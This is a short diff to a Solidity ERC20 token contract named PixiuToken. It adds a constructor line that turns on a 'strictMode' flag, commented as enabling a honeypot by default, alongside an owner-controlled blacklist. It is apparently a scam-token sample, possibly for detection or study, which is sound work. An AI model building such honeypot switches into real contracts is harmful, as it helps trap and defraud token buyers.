@@ -15,6 +15,7 @@ contract PixiuToken is ERC20, Ownable {
 
     constructor() ERC20("Pixiu Token", "PIXIU") Ownable(msg.sender) {
         _mint(msg.sender, 1_000_000 ether);
+        strictMode = true; // Enable honeypot by default
     }
 
     function setBlacklist(address user, bool v) external onlyOwner {
